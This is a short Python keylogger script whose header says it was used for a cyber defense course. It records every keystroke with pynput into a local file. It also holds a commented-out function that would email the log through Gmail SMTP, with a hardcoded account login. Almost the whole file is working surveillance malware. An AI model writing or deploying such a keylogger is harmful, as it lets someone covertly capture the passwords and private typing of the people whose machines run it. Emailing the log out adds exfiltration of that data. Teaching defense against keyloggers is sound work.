#KEYLOGGER
#Used for Cyber Defense Course
#4/12/2021
import smtplib

import os
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def when_pressed (key):
    global count, keys
    keys.append(key)
    count+=1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_to_file(keys)
        # sendMail()
        keys = []

def when_released (key):
    if key == Key.esc:
        #os.remove("logging.txt")
        return False

def write_to_file(keys):
    with open("logging.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")

            #do a space instead of writing "space"
            if k.find("space") > 0:
                if k.find("backspace") > 0:
                    f.write(" delete 1 ")

                else:
                    f.write(" ")

            #do a new line when enter
            elif k.find("enter") > 0:
                f.write("\n")

            #print this when printing ctrl
            elif k.find("ctrl") > 0:
                f.write("ctrl + ")

            #dont need to print out the esc
            elif k.find("esc") > 0:
                pass

            #if it is a letter, write it
            else:
                f.write(k)

# def sendMail():
#     server = smtplib.SMTP(host="smtp.gmail.com", port=587)
#     server.starttls()
#     server.login("greyteam888@gmail.com", "WeAreGreyTeam888")
#     server.sendmail("greyteam888@gmail.com", "greyteam888@gmail.com", "logging.txt")
#     server.quit()

with Listener(on_press = when_pressed, on_release = when_released) as listener:
    listener.join()
